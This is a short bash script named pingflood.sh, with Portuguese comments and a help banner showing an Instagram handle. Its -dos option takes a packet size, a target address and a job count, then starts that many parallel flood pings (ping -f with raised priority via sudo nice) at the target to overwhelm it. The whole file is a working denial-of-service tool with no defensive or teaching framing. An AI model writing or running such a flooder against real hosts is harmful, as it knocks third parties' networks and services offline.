#!/bin/bash

if [ "$1" == "-dos" ]; then
  bytes=$2       # Define o número de bytes enviados
  ip=$3          # Define o alvo
  paralelo=$4    # Define trabalhos em paralelo

  # Função para capturar a interrupção (Ctrl+C) e matar todos os pings
  trap "kill 0" SIGINT

  # Executando múltiplos pings em paralelo
  for i in $(seq 1 $paralelo); do
      sudo nice -n -20 ping -f -s $bytes $ip &
  done

  wait # Espera todas as operações em segundo plano terminarem

#############HELP

elif [ "$1" == "-h" ]; then
  echo "+---------------------------+"
  echo "| instagram: @rafael_cyber1 |"
  echo "|---------------------------|"
  echo "|-----pingflood.sh V.1.0----|"
  echo "+---------------------------+"
  echo "pingflood.sh -dos <bytes> <alvo> <paralelo>"
fi
